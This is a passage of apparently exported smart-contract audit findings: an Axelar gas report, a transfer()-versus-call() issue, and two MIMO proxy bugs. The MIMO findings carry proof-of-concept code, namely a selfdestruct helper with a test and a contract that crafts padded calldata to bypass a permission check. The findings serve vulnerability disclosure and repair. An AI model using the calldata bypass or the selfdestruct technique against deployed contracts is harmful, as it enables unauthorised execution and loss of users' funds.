revert('NotXc20Token()');         revert('AlreadyWrappingAxelarToken()');         revert('AlreadyWrappingXC20Token()');`          2. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L60#L61 :        `revert('NotOwner()');        revert('CannotSetMetadata()');`    3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L68 :         'revert('NotAxelarToken()');'         4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L70 :        `revert('NotWrappingToken()');`    1. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L78#L79 :        `revert('NotAxelarToken()');        revert('CannotMint()');`          2. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L84#L86 :        `revert('NotXc20Token()');        revert('InsufficientBalance()');        revert('CannotBurn()');`    3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L98 :         'revert('TransferFailed()');'         4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L111 :        `revert('TransferFailed()');`         #  [G-09] Functions guaranteed to revert when called by normal users can be marked payable (If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.) :-     1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L204 :        ` function setTokenDailyMintLimits(string[] calldata symbols, uint256[] calldata limits) external override onlyAdmin {`          2. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L217#L221 :        `function upgrade(         address newImplementation,         bytes32 newImplementationCodeHash,         bytes calldata setupParams     ) external override onlyAdmin {`    3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L331 :         'function deployToken(bytes calldata params, bytes32) external onlySelf {'         4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L367 :        `function mintToken(bytes calldata params, bytes32) external onlySelf {`    5. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L373 :        `function burnToken(bytes calldata params, bytes32) external onlySelf {`          6. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L397 :        `function approveContractCall(bytes calldata params, bytes32 commandId) external onlySelf {`    7. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L411 :         'function approveContractCallWithMint(bytes calldata params, bytes32 commandId) external onlySelf {'         8. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L437 :        `function transferOperatorship(bytes calldata newOperatorsData, bytes32) external onlySelf {`               9. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L120 :        `function collectFees(address payable receiver, address[] calldata tokens) external onlyOwner {`          10. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L136#L140 :        `function refund(         address payable receiver,         address token,         uint256 amount     ) external onlyOwner {`    11. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L47 :         'function transferOperatorship(bytes calldata params) external onlyOwner {'         12. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L44 :        `function setXc20Codehash(bytes32 newCodehash) external onlyOwner {`    13. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L48#L53 :        ` function addWrapping(         string calldata symbol,         address xc20Token,         string memory newName,         string memory newSymbol     ) external payable onlyOwner {`          14. https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L66 :        `function removeWrapping(string calldata symbol) external onlyOwner {`    15. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L411 :         'function approveContractCallWithMint(bytes calldata params, bytes32 commandId) external onlySelf {'         16. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L437 :        `function transferOperatorship(bytes calldata newOperatorsData, bytes32) external onlySelf {`             #  [G-10] Use a more recent version of solidity :-     1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L3 :        `pragma solidity 0.8.9;`          2. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IDepositBase.sol#L3 :        `pragma solidity 0.8.9;`    3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L3 :         'pragma solidity 0.8.9;'         4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasServiceProxy.sol#L3 :        `pragma solidity 0.8.9;`    5. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarAuth.sol#L3 :        `pragma solidity 0.8.9;`          6. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarGasService.sol#L3 :        `pragma solidity 0.8.9;`    7. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarDepositService.sol#L3 :         'pragma solidity 0.8.9;'         8. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/interfaces/IAxelarAuthWeighted.sol#L3 :        `pragma solidity 0.8.9;`               9. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/DepositReceiver.sol#L3 :        `pragma solidity 0.8.9;`          10. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositService.sol#L3 :        `pragma solidity 0.8.9;`    11. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/DepositBase.sol#L3 :         'pragma solidity 0.8.9;'         12. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/ReceiverImplementation.sol#L3 :        `pragma solidity 0.8.9;`    13. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/deposit-service/AxelarDepositServiceProxy.sol#L3 :        `pragma solidity 0.8.9;`          14. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/auth/AxelarAuthWeighted.sol#L3 :        `pragma solidity 0.8.9;`    15. File: https://github.com/code-423n4/2022-07-axelar/blob/main/xc20/contracts/XC20Wrapper.sol#L3 :         'pragma solidity 0.8.9;'          #  [G-11]  `internal` functions only called once can be inlined to save gas :-     1. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L460 :        `function _callERC20Token(address tokenAddress, bytes memory callData) internal returns (bool) {`          2. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L465#L469 :        `function _mintToken(         string memory symbol,         address account,         uint256 amount     ) internal {`    3. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L485#L489 :         'function _burnTokenFrom(         address sender,         string memory symbol,         uint256 amount     ) internal {'         4. File: https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L539#L557 :        `function _getTokenDailyMintLimitKey(string memory symbol) internal pure returns (bytes32) {         return keccak256(abi.encodePacked(PREFIX_TOKEN_DAILY_MINT_LIMIT, symbol));     }      function _getTokenDailyMintAmountKey(string memory symbol, uint256 day) internal pure returns (bytes32) {         return keccak256(abi.encodePacked(PREFIX_TOKEN_DAILY_MINT_AMOUNT, symbol, day));     }      function _getTokenTypeKey(string memory symbol) internal pure returns (bytes32) {         return keccak256(abi.encodePacked(PREFIX_TOKEN_TYPE, symbol));     }      function _getTokenAddressKey(string memory symbol) internal pure returns (bytes32) {         return keccak256(abi.encodePacked(PREFIX_TOKEN_ADDRESS, symbol));     }      function _getIsCommandExecutedKey(bytes32 commandId) internal pure returns (bytes32) {         return keccak256(abi.encodePacked(PREFIX_COMMAND_EXECUTED, commandId));     }`    5. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/AxelarGateway.sol#L559#L658 :        ` function _getIsContractCallApprovedKey(         bytes32 commandId,         string memory sourceChain,         string memory sourceAddress,         address contractAddress,         bytes32 payloadHash     ) internal pure returns (bytes32) {         return keccak256(abi.encode(PREFIX_CONTRACT_CALL_APPROVED, commandId, sourceChain, sourceAddress, contractAddress, payloadHash));     }      function _getIsContractCallApprovedWithMintKey(         bytes32 commandId,         string memory sourceChain,         string memory sourceAddress,         address contractAddress,         bytes32 payloadHash,         string memory symbol,         uint256 amount     ) internal pure returns (bytes32) {         return             keccak256(                 abi.encode(                     PREFIX_CONTRACT_CALL_APPROVED_WITH_MINT,                     commandId,                     sourceChain,                     sourceAddress,                     contractAddress,                     payloadHash,                     symbol,                     amount                 )             );     }      /********************\\     |* Internal Getters *|     \\********************/      function _getTokenType(string memory symbol) internal view returns (TokenType) {         return TokenType(getUint(_getTokenTypeKey(symbol)));     }      /********************\\     |* Internal Setters *|     \\********************/      function _setTokenDailyMintLimit(string memory symbol, uint256 limit) internal {         _setUint(_getTokenDailyMintLimitKey(symbol), limit);          emit TokenDailyMintLimitUpdated(symbol, limit);     }      function _setTokenDailyMintAmount(string memory symbol, uint256 amount) internal {         uint256 limit = tokenDailyMintLimit(symbol);         if (limit > 0 && amount > limit) revert ExceedDailyMintLimit(symbol);          _setUint(_getTokenDailyMintAmountKey(symbol, block.timestamp / 1 days), amount);     }      function _setTokenType(string memory symbol, TokenType tokenType) internal {         _setUint(_getTokenTypeKey(symbol), uint256(tokenType));     }      function _setTokenAddress(string memory symbol, address tokenAddress) internal {         _setAddress(_getTokenAddressKey(symbol), tokenAddress);     }      function _setCommandExecuted(bytes32 commandId, bool executed) internal {         _setBool(_getIsCommandExecutedKey(commandId), executed);     }      function _setContractCallApproved(         bytes32 commandId,         string memory sourceChain,         string memory sourceAddress,         address contractAddress,         bytes32 payloadHash     ) internal {         _setBool(_getIsContractCallApprovedKey(commandId, sourceChain, sourceAddress, contractAddress, payloadHash), true);     }      function _setContractCallApprovedWithMint(         bytes32 commandId,         string memory sourceChain,         string memory sourceAddress,         address contractAddress,         bytes32 payloadHash,         string memory symbol,         uint256 amount     ) internal {         _setBool(             _getIsContractCallApprovedWithMintKey(commandId, sourceChain, sourceAddress, contractAddress, payloadHash, symbol, amount),             true         );     }      function _setImplementation(address newImplementation) internal {         _setAddress(KEY_IMPLEMENTATION, newImplementation);     } }`          6. https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L150#L154 :        `function _safeTransfer(         address tokenAddress,         address receiver,         uint256 amount     ) internal {`    7."}, {"title": "CALL() SHOULD BE USED INSTEAD OF TRANSFER() ON AN ADDRESS PAYABLE", "html_url": "https://github.com/code-423n4/2022-07-axelar-findings/issues/4", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-axelar-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L128 https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L144 https://github.com/code-423n4/2022-07-axelar/blob/main/contracts/gas-service/AxelarGasService.sol#L158   # Vulnerability details   # Vulnerability details   ## Impact The use of the deprecated transfer() function for an address will inevitably make the transaction fail when:  The claimer smart contract does not implement a payable function. The claimer smart contract does implement a payable fallback which uses more than 2300 gas unit. The claimer smart contract implements a payable fallback function that needs less than 2300 gas units but is called through proxy, raising the call\u2019s gas usage above 2300. Additionally, using higher than 2300 gas might be mandatory for some multisig wallets. Whenever the user either fails to implement the payable fallback function or cumulative gas cost of the function sequence invoked on a native token transfer exceeds 2300 gas consumption limit the native tokens sent end up undelivered and the corresponding user funds return functionality will fail each time. The impact would mean that any contracts receiving funds would potentially be unable to retrieve funds from the swap.  ## Recommended Mitigation Steps use call() to send eth , re-entrancy has been accounted for in all functions that reference Solidity's transfer() . This has been done by using a re-entrancy guard, therefore, we can rely on msg.sender.call.value(amount)` or using the OpenZeppelin Address.sendValue library   Relevant links: https://github.com/code-423n4/2021-04-meebits-findings/issues/2 https://twitter.com/hacxyk/status/1520715516490379264?s=21&t=fnhDkcC3KpE_kJE8eLiE2A https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/"}, {"title": "If a MIMOProxy owner destroys their proxy, they cannot deploy another from the same address", "html_url": "https://github.com/code-423n4/2022-08-mimo-findings/issues/162", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-mimo-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyRegistry.sol#L45-L59   # Vulnerability details  When deploying a new `MIMOProxy`, the `MIMOProxyRegistry` first checks whether a proxy exists with the same owner for the given address. If an existing proxy is found, the deployment reverts:  [`MIMOProxyRegistry#deployFor`](https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyRegistry.sol#L45-L59)  ```solidity   function deployFor(address owner) public override returns (IMIMOProxy proxy) {     IMIMOProxy currentProxy = _currentProxies[owner];      // Do not deploy if the proxy already exists and the owner is the same.     if (address(currentProxy) != address(0) && currentProxy.owner() == owner) {       revert CustomErrors.PROXY_ALREADY_EXISTS(owner);     }      // Deploy the proxy via the factory.     proxy = factory.deployFor(owner);      // Set or override the current proxy for the owner.     _currentProxies[owner] = IMIMOProxy(proxy);   } } ```  However, if a `MIMOProxy` owner intentionally or accidentally destroys their proxy by `delegatecall`ing a target that calls `selfdestruct`, the address of their destroyed proxy will remain in the `_currentProxies` mapping, but the static call to `currentProxy.owner()` on L49 will revert. The caller will be blocked from deploying a new proxy from the same address that created their original `MIMOProxy.  **Impact:** If a user accidentally destroys their MIMOProxy, they must use a new EOA address to deploy another.  ### Recommendation  Check whether the proxy has been destroyed as part of the \"proxy already exists\" conditions. If the proxy address has a codesize of zero, it has been destroyed:  ```solidity     // Do not deploy if the proxy already exists and the owner is the same.     if (address(currentProxy) != address(0) && currentProxy.code.length > 0 && currentProxy.owner() == owner) {       revert CustomErrors.PROXY_ALREADY_EXISTS(owner);     }  ```  ### Test cases  We'll use this `ProxyAttacks` helper contract to manipulate proxy storage. Note that it has the same storage layout as `MIMOProxy`.  ```solidity contract ProxyAttacks {     address public owner;    uint256 public minGasReserve;    mapping(address => mapping(address => mapping(bytes4 => bool))) internal _permissions;     // Selector 0x9cb8a26a    function selfDestruct() external {      selfdestruct(payable(address(0)));    } } ```  Then deploy the `ProxyAttacks` helper in a test environment and use `MIMOProxy` to `delegatecall` into it:  ```typescript import chai, { expect } from 'chai'; import { solidity } from 'ethereum-waffle'; import { deployments, ethers } from 'hardhat';  import { MIMOProxy, MIMOProxyFactory, MIMOProxyRegistry, ProxyAttacks } from '../../typechain';  chai.use(solidity);  const setup = deployments.createFixture(async () => {   const { deploy } = deployments;   const [owner, attacker] = await ethers.getSigners();    await deploy(\"MIMOProxy\", {     from: owner.address,     args: [],   });   const mimoProxyBase: MIMOProxy = await ethers.getContract(\"MIMOProxy\");    await deploy(\"MIMOProxyFactory\", {     from: owner.address,     args: [mimoProxyBase.address],   });   const mimoProxyFactory: MIMOProxyFactory = await ethers.getContract(\"MIMOProxyFactory\");    await deploy(\"MIMOProxyRegistry\", {     from: owner.address,     args: [mimoProxyFactory.address],   });   const mimoProxyRegistry: MIMOProxyRegistry = await ethers.getContract(\"MIMOProxyRegistry\");    await deploy(\"ProxyAttacks\", {     from: owner.address,     args: [],   });   const proxyAttacks: ProxyAttacks = await ethers.getContract(\"ProxyAttacks\");    return {     owner,     attacker,     mimoProxyBase,     mimoProxyFactory,     mimoProxyRegistry,     proxyAttacks,   }; });  describe(\"Proxy attack tests\", () => {   it(\"Proxy instance self destruct + recreation\", async () => {     const { owner, mimoProxyRegistry, proxyAttacks } = await setup();     await mimoProxyRegistry.deploy();     const currentProxy = await mimoProxyRegistry.getCurrentProxy(owner.address);     const proxy = await ethers.getContractAt(\"MIMOProxy\", currentProxy);      // Delegatecall to selfDestruct on ProxyAttacks contract     await proxy.execute(proxyAttacks.address, \"0x9cb8a26a\");      // Owner's existing proxy is destroyed     expect(proxy.owner()).to.be.revertedWith(\"call revert exception\");      // Cannot deploy another proxy for this address through the registry     await expect(mimoProxyRegistry.deploy()).to.be.revertedWith(\"function returned an unexpected amount of data\");   }); }); ```"}, {"title": "Incorrect implementation of access control in MIMOProxy:execute", "html_url": "https://github.com/code-423n4/2022-08-mimo-findings/issues/159", "labels": ["bug", "question", "3 (High Risk)", "sponsor confirmed"], "target": "2022-08-mimo-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L54 https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L104   # Vulnerability details  ## Description  There is a function `execute` in `MIMOProxy` smart contract. The function performs a delegate call to the user-specified address with the specified data. As an access control, the function checks that either it was called by the owner or the owner has previously approved that the sender can call a specified target with specified calldata. See https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L104.   The check itself:   ```     if (owner != msg.sender) {       bytes4 selector;       assembly {         selector := calldataload(data.offset)       }       if (!_permissions[msg.sender][target][selector]) {         revert CustomErrors.EXECUTION_NOT_AUTHORIZED(owner, msg.sender, target, selector);       }     } ```  The problem is how the `selector` is calculated. Specifically, `calldataload(data.offset)` - reads first 4 bytes of `data`.  Imagine `data.length == 0`, does it mean that `calldataload(data.offset)` will return `bytes4(0)`? No.  Let's see how calldata are accepted by functions in Solidity. The solidity function checks that the calldata length is less than needed, but does NOT check that there is no redundant data in calldata. That means, the function `execute(address target, bytes calldata data)` will definitely accept data that have `target` and `data`, but also in calldata can be other user-provided bytes. As a result,  `calldataload(data.offset)` can read trash, but not the `data` bytes.  And in the case of `execute` function, an attacker can affect the execution by providing `trash` data at the end of the function. Namely, if the attacker has permission to call the function with some `signature`, the attacker can call proxy contract bypass check for signature and make delegate call directly with zero calldata.  Please see proof-of-concept (PoC), `getAttackerCalldata` returns a calldata with which it is possible to bypass check permission for signature. Function `execute` from PoC simulate check for permission to call `signatureWithPermision`, and enforce that `data.length == 0`. With calldata from `getAttackerCalldata` it works.  ## Impact  Any account that have permission to call at least one function (signature) to the contract can call fallback function without without permission to do so.  ## Proof of Concept  ``` // SPDX-License-Identifier: MIT OR Apache-2.0  pragma solidity ^0.8.0;  interface IMIMOProxy {   event Execute(address indexed target, bytes data, bytes response);    event TransferOwnership(address indexed oldOwner, address indexed newOwner);    function initialize() external;    function getPermission(     address envoy,     address target,     bytes4 selector   ) external view returns (bool);    function owner() external view returns (address);    function minGasReserve() external view returns (uint256);    function execute(address target, bytes calldata data) external payable returns (bytes memory response);    function setPermission(     address envoy,     address target,     bytes4 selector,     bool permission   ) external;    function transferOwnership(address newOwner) external;    function multicall(address[] calldata targets, bytes[] calldata data) external returns (bytes[] memory); }  contract PoC {     bytes4 public signatureWithPermision = bytes4(0xffffffff);      // Call this function with calldata that can be prepared in `getAttackerCalldata`     function execute(address target, bytes calldata data) external {         bytes4 selector;         assembly {             selector := calldataload(data.offset)         }          require(selector == signatureWithPermision);          require(data.length == 0);     }      // Function that prepare attacker calldata     function getAttackerCalldata() public view returns(bytes memory)  {         bytes memory usualCalldata = abi.encodeWithSelector(IMIMOProxy.execute.selector, msg.sender, new bytes(0));         return abi.encodePacked(usualCalldata, bytes32(signatureWithPermision));     } } ```  ## Recommended Mitigation Steps  Add `require(data.length >= 4);`"}]